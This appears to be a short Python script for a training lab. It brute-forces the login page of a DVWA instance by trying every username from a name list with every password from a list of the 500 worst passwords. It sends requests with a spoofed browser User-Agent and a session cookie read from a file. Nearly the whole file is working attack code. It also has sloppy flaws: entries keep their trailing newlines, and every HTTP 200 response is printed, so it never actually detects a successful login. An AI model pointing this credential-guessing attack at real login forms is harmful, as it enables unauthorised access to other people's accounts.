#!/usr/bin/python3

NAMEFILE = "namelist.txt"
PASSFILE = "500-worst-passwords.txt"

import requests
from http import cookies

c = cookies.SimpleCookie()

url = "http://dvwa.local/vulnerabilities/brute"

nf = open(NAMEFILE,'r')

pf = open(PASSFILE,'r')

sess = open("PHPSESSID",'r')
try:
    usernames = nf.readlines()
    passwords = pf.readlines()

    cook = {"PHPSESSID" : sess.readline(), "security" : 'low' }

#    print(cook)
finally:
   nf.close()
   pf.close()

for user in usernames:
    for password in passwords:

        response = requests.get(url,headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0'}, params = {'username' : user, 'password' : password, 'Login' : "Login"}, cookies=cook)

        if response.status_code == 200:
            print(response.text)


